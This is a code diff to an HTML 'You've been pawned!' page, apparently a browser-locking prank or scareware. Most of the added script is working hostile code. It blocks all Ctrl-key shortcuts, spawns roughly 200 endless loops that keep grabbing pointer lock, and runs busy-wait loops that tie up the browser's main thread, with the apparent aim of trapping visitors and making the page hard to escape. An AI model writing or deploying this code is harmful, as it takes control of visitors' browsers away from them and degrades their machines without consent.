@@ -43,6 +43,7 @@
             <h1 style="color:white;text-align:center;cursor:default;">You've been pawned!</h1>
             <button id="button">Click to exit</button>
         </div>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
         <script>
             function LockPointer(){document.documentElement.requestPointerLock().catch(()=>{})};
             function unMute(){
@@ -86,7 +87,41 @@
                 document.addEventListener("touch", LockPointer)
             }
             window.onload = loader
-            window.onbeforeunload = () => {return false;}
-       </script>
+            // window.onbeforeunload = () => {return false;}
+            
+            $(document).ready(function () {
+                $(document).on("keydown", function(e) {
+                    e = e || window.event;
+                    if (e.ctrlKey) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                    }
+                });
+            });
+        document.addEventListener('pointerlockchange', () => {
+        if (document.pointerLockElement != null) {
+            document.exitPointerLock();
+        }
+        });
+
+        function subsleep(ms){
+            const start = performance.now()
+            while ((performance.now()-start)<ms){}
+        }
+
+        async function x(){
+        while (true){
+        await new Promise((r)=>{setTimeout(r,1)})
+            setTimeout(async ()=>{
+                try{await document.body.requestPointerLock({unadjustedMovement:true})}catch{}
+            },1);}
+        }
+
+        const t = 1/200
+        for(let i = 0; i < 1/t; i++){
+            x()
+            subsleep(t)
+        }
+    </script>
    </body>
 </html>
